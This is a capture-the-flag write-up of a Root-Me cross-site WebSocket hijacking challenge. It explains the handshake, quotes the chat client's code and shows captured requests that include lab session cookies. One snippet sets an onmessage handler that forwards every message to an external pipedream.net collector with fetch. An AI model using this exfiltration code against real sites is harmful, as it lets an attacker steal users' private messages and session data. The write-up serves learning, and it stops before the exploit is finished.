---
title: Websockets
Summary: Unprotected websocket challange from root-me.
date: "2024-09-04"
#https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/cross-site-websocket-hijacking-cswsh.md#simple-attack
---

![Websocket_1](websockets.svg)

# Introduction

Today I'm going to talk about web sockets, you may have found `wss://` or `ws://` somewhere and wonder what's that, well I'll try to explain the best I can :)

## What are web Sockets?

WebSockets are widely used in modern web applications. They are initiated over HTTP and provide long-lived connections with asynchronous communication in both directions.
WebSockets are used for all kinds of purposes, including performing user actions and transmitting sensitive information. Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications.

You may have seen some [HTTP 101](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/101) code for `SWITCHING PROTOCOLS`. In most of the cases this is the initiatior of a websocket connection, this request also contains a `Upgrade` header containing the protocol the client wants to switch to, this header will ask the server if it's possible to switch to that protocol.

## What is the difference between HTTP and WebSockets?

Most communication between web browsers and web sites uses HTTP. With HTTP, the client sends a request and the server returns a response. Typically, the response occurs immediately, and the transaction is complete. Even if the network connection stays open, this will be used for a separate transaction of a request and a response.

WebSocket connections are initiated over HTTP and are typically long-lived. Messages can be sent in either direction at any time and are not transactional in nature, and by non-transactional meaning not expecting any response. The connection will normally stay open and idle until either the client or the server is ready to send a message.

WebSockets are particularly useful in situations where low-latency or server-initiated messages are required, such as real-time feeds of financial data, live-chat apps or intercom banners.

## How are WebSocket connections established?

WebSocket connections are normally created using client-side JavaScript like the following:

```js
// for secure websocket connections
var ws = new WebSocket("wss://target-website.com/ws");
// for insecure websocket connections
var ws = new WebSocket("ws://target-website.com/ws");

// A HTTP REQUEST for switching protocols to websocket
GET ws://host/ws HTTP/1.1
Host: ctf07.root-me.org
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: nQ+0IHd8Ey26tEU5mum6QA==
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits

// The USUAL response headers
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: a7A1ESC2+XPFwy2coXGo3avSOLg=
```



## Check connection status

If you head to the ["mozilla mdn docs"](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket/readyState) there is a rich page with really useful information about the websocket connection state. This way we can ensure wether we're connected (or not!):

| Value |    State   |                        Description                       |
|:-----:|:----------:|:--------------------------------------------------------:|
| 0     | CONNECTING | Socket has been created. The connection is not yet open. |
| 1     | OPEN       | The connection is open and ready to communicate.         |
| 2     | CLOSING    | The connection is in the process of closing.             |
| 3     | CLOSED     | The connection is closed or couldn't be opened.          |

This is the information that we need!

## Check for javascript files

We can crawl through the website and see some javascript snippet which contains the logic of the vulnerable chat box:

```js
$(function () {
    var input = $('#input');
    var connection = new WebSocket('ws://'+window.location.hostname+'/ws');  
    connection.onopen = function () {};  
    connection.onerror = function (error) {
      alert("An error occured, you will reload the page for you to access a new room !")
      location.reload()
    };
    connection.onmessage = function (message) {
      $("#chatbox").append("You: "+$("#input").val().replace('<','').replace('>','')+"\n")
      $("#chatbox").append("\nBot: "+message["data"].replace('<','').replace('>','')+"\n-------------------------------------------------------------\n")
      $('#chatbox').scrollTop($('#chatbox')[0].scrollHeight);
      $("#input").val("")
    };
    connection.onclose = function(message) {
      $('#chatbox').append("--------------------------END OF COMMUNICATION--------------------------")
    }
    input.keydown(function(e) {
      if (e.keyCode === 13) {
        var msg = $("#input").val();
        if (!msg) {
          return;
        }
        connection.send(msg);
      }
    });
});
```

We can quickly see the `replace('<','').replace('>','')` functions, meaning if we try to encrust some html tags the `</>` characters will be removed. We could elude that removal with some [CSFR](https://owasp.org/www-community/attacks/csrf). The easy and obvious way to proceed is copy pasting the logic except the replace parts.
Let's do it!

## Begin the connection

```javascript
var ws = new WebSocket('ws://'+window.location.hostname+'/ws');
ws.readyState // this should return 1 meaning it's ready to communicate

// now we need a event handler to capture this evnet.
function start (message) {
  $("#chatbox").append("You: "+$("#input").val() + "\n")
  $("#chatbox").append("\nBot: "+message["data"] +"\n-------------------------------------------------------------\n")
  $('#chatbox').scrollTop($('#chatbox')[0].scrollHeight);
  $("#input").val("")
}

// Our CSRF should be something like this.
// Can you notice the liposuction?
ws.onmessage = function (event) {
  fetch('https://eor5pi7epfnejaq.m.pipedream.net/?'+event.data, {mode: 'no-cors'})
}
```

Now, thanks to the websocket [API docs](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket/open_event) we can handle an event (or function) for our very malicious use.


# Let's get this party started

First, let's analyze if there's any CSRF TOKEN, if the connection is secured only by the cookie, we can hijack the user the html files for example, from another domain.
Let's open burp and initiate a WS connection, what do we see?

```html
GET /ws HTTP/1.1
Sec-WebSocket-Version: 13
Origin: http://ctf10.blabla
Sec-WebSocket-Key: iTI6sd0uJHFmgn5gu8kHLA==
Connection: keep-alive, Upgrade
Cookie: _ga_SRYSKX09J7=GS1.1.1659040468.3.1.1659042535.0; _ga=GA1.1.239451001.1658089567; connect.sid=s%3AdFQWhWUSdk2LvNXIraAJOcP3Gdr5Zw5z.1aRYfGUzzd6cOK5KeH6zNeTdzwOcvbFYngmjfzMecyY
Upgrade: websocket
```

Response:

```yaml
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: mi0J6oYY40on/uTajuMWA/m+Ckc=
```

See, 3 cookies are set and there's nothing regarding CSRF tokens, looks nice.... but what about if we delete the cookies and reconnect again, will we be able to interact with the server?

sending ws message:
> Unable to verify your identity, please log in before chatting with me.

We got something!!! Now that we don't have any cookie, the connection is being made but requests are being rejected by WSS: We need some cookies!
Cookies can be gathered from a victim's pov

ws://ctf04.root-me.org/ws

https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc



Let's examine an example http websockets request:
```
GET /ws HTTP/1.1
Host: ctf25.root-me.org
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Upgrade: websocket
Origin: http://ctf25.root-me.org
Sec-WebSocket-Version: 13
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.1.1295502163.1725475708; _ga_SRYSKX09J7=GS1.1.1725515082.2.1.1725516116.0.0.0; connect.sid=s%3Ae_W0BpxLsWcg0QMiqPHHqxIdaoMEI6C9.CrORUd6Q7kAXCfSi29lBjT6F5kz0sytGlX5yvM2B7Zs
Sec-WebSocket-Key: P4+G7k4UtIAvDubnRYam8A==
```